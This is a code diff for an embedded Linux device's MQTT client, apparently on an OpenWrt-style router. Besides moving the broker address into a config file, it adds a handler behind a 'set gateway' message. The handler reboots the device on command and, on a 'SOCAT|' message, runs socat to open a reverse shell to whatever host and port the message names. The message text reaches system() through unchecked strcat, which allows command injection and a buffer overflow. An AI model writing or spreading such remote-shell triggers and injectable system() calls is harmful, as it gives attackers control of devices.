@@ -2,6 +2,7 @@
 #include <stdio.h>
 #include <stdint.h>
 #include <unistd.h>
+#include <stdlib.h>
 
 #include <syslog.h>
 #include <pthread.h>
@@ -10,6 +11,7 @@
 #include <libubox/uloop.h>
 #include <libubus.h>
 
+#include <uci.h>
 
 #include "myqueue.h"
 #include "mymqtt.h"
@@ -109,6 +111,41 @@ int  ubussrv_server_add( void )
 }
 
 
+void  test_set_gateway( char * msg )
+{
+    if ( 0 == strcmp( msg, "RST" ) )
+    {
+        system( "reboot" );
+        return;
+    }
+
+    if ( 0 == strncmp( msg, "SOCAT|", 6) )
+    {
+        char * paddr;
+        char * pport;
+        char  cmdln[128] = "socat 'exec:sh,pty,stderr'  tcp4-connect:";
+        /**/
+        paddr = &(msg[6]);
+        pport = strchr( paddr, '|' );
+        if ( pport == NULL )
+        {
+            return;
+        }
+        *pport = ':';
+        
+        /**/
+        strcat( cmdln, paddr );
+        strcat( cmdln, " &" );
+        system( cmdln );
+        return;
+    }
+    
+    return;
+    
+}
+
+
+
 void  test_uloopfd_cbk(struct uloop_fd * pufd, unsigned int events)
 {
     int  iret;
@@ -139,6 +176,13 @@ void  test_uloopfd_cbk(struct uloop_fd * pufd, unsigned int events)
 
         /**/
         printf( "msq : %d,%d : %s\n", pmsg->action, pmsg->object, pmsg->msg );
+
+        /**/
+        if ( (pmsg->action == MT_ACT_SET) && (pmsg->object == MT_OBJ_GATE) )
+        {
+            test_set_gateway( pmsg->msg );
+        }
+        
     }
 
     /**/
@@ -190,7 +234,7 @@ cfg->protocol_version = MQTT_PROTOCOL_V31;
 */
 
 
-int  test( void )
+int  test_run( char * ipdr, int port )
 {
     int  iret;
     int  tfd;
@@ -203,7 +247,7 @@ int  test( void )
     }
 
     /**/
-    iret = mmqt_init( qctx, "10.4.44.210", 8020, &mtctx );
+    iret = mmqt_init( qctx, ipdr, port, &mtctx );
     if ( 0 != iret )
     {
         return 2;
@@ -250,13 +294,94 @@ int  test( void )
 }
 
 
+int test_get_config( char * ipdr, int * port )
+{
+    struct uci_context * uci;
+    struct uci_package * upkg;
+    struct uci_element * uele;
+    struct uci_section * usec;
+    const char * ptr;
+    int iret;
+    
+
+    /**/
+    uci = uci_alloc_context();
+    iret = uci_load( uci, "jyconfig", &upkg );
+    if ( 0 != iret )
+    {
+        uci_free_context( uci );
+		return 1;
+    }
+    
+    /**/
+    uci_foreach_element( &upkg->sections, uele )
+    {
+        usec = uci_to_section( uele );
+        if( 0 != strcmp( usec->type, "mqttclient") )
+        {
+            continue;
+        }
+
+        /**/
+        ptr = uci_lookup_option_string( uci, usec, "server" );
+        if ( NULL == ptr )
+        {
+            iret = 2;
+            break;
+        }
+
+        if ( strlen(ptr) > 16 )
+        {
+            iret = 4;
+            break;
+        }
+
+        /**/
+        strcpy( ipdr, ptr );
+        
+        /**/
+	    ptr = uci_lookup_option_string( uci, usec, "port" );
+        if ( NULL == ptr )
+        {
+            iret = 3;
+            break;
+        }
+
+        /**/
+        *port = strtoul( ptr, NULL, 10 );
+        iret = 0;
+        break;
+    }
+
+exit:
+    uci_free_context( uci );
+    return iret;
+    
+}
+
+
 int  main( void )
 {
     int  iret;
+    char  ipdr[20];
+    int  port;
 
-    iret = test();
+    /**/
+    iret = test_get_config( ipdr, &port );
+    if ( 0 != iret )
+    {
+        printf( "get cfg ret %d\n", iret );
+        return 1;
+    }
+
+    /**/
+    
+    /**/
+    iret = test_run( ipdr, port );
     printf( "test ret %d\n", iret );
     return 0;
+    
 }
+
 
 
